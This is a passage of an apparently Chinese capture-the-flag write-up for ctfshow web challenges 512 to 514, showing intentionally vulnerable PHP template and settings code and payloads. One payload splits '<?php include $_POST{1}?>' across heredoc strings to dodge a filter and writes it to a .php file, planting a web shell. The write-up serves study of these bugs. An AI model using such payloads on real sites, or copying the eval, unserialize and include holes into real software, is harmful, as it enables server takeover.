class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为过滤掉了()所以采用include</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="comment">#为了结束上一个$v的赋值语句</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">&lt;?php includ</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">e $</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$v1</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">_POS</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&lt;&lt;&lt; ctfshow</span></span><br><span class="line"><span class="string">T&#123;1&#125;?&gt;</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">1.php</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">clone</span> <span class="variable">$db</span>;<span class="comment">#克隆一个$db对象,原因是$db有写文件的方法</span></span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;log = <span class="variable">$d</span>;<span class="comment">#前一个log是db类的log后面的是dblog类的log</span></span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;content = <span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$v1</span>.<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#$a.$b.$v1$c=&lt;?php include $_POST&#123;1&#125;?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">&lt;?php includ</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">e $</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$v1</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">_POS</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">T&#123;1&#125;?&gt;</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">2.php</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">clone</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;log=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;content=<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$v1</span>.<span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">var</span>:nickname&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163202241.png" alt="image-20220414163202241"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155052515.png" alt="image-20220414155052515"></p><p>记得抓包改</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155109466.png" alt="image-20220414155109466"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163241108.png" alt="image-20220414163241108"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163406655.png" alt="image-20220414163406655"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163441821.png" alt="image-20220414163441821"></p><h1 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h1><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-26 07:25:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkFoot</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line"><span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line"><span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&#x2F;api&#x2F;admin_settings.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line"><span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line"><span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将config中的cnzz改成另一个文件,这样就可以使foot先访问config中的cnzz,接着cnzz又是另一个文件.进行二次文件访问.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414175947530.png" alt="image-20220414174933530"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180031940.png" alt="image-20220414180031940"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180041275.png" alt="image-20220414180041275"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180054215.png" alt="image-20220414180054215"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180124402.png" alt="image-20220414180124402"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181027066.png" alt="image-20220414181027066"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181233123.png" alt="image-20220414181233123"></p><h1 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h1><p>render&#x2F;render_class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-28 16:27:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line"><span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line"><span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkFoot</span>(<span class="variable">$templateContent</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line"><span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$encode</span>=<span 